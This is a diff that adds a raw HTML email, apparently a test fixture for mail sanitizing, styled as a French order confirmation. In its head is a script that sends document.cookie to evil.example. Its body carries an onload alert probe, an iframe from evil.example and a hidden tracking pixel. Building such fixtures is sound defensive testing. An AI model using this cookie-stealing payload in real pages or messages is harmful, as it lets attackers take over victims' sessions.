@@ -1,0 +1,24 @@
+Date: Tue, 27 Oct 2026 18:40:00 +0100
+From: =?ISO-8859-1?Q?Caf=E9_de_la_Gare?= <orders@shop.example>
+To: me@example.com
+Subject: =?ISO-8859-1?Q?Votre_commande_est_confirm=E9e_=E0_la_caisse?=
+Message-ID: <order-88231.1761586800@shop.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=ISO-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html><head><meta charset=3D"iso-8859-1">
+<link rel=3D"stylesheet" href=3D"https://cdn.shop.example/mail.css">
+<script>document.location=3D'https://evil.example/steal?c=3D'+document.cook=
+ie</script>
+<style>p{font-family:Arial}</style></head>
+<body onload=3D"alert('x')">
+<p>Bonjour, votre commande au Caf=E9 de la Gare est confirm=E9e.</p>
+<p><img src=3D"https://img.shop.example/banner.jpg" alt=3D"Banni=E8re"></p>
+<p><a href=3D"https://click.shop.example/r?u=3Dabc123&amp;l=3D1" onclick=3D=
+"track()">Voir la commande</a></p>
+<iframe src=3D"https://evil.example/frame"></iframe>
+<img src=3D"https://track.shop.example/open.gif?u=3Dabc123" width=3D"1" hei=
+ght=3D"1" style=3D"display:none" alt=3D"">
+</body></html>
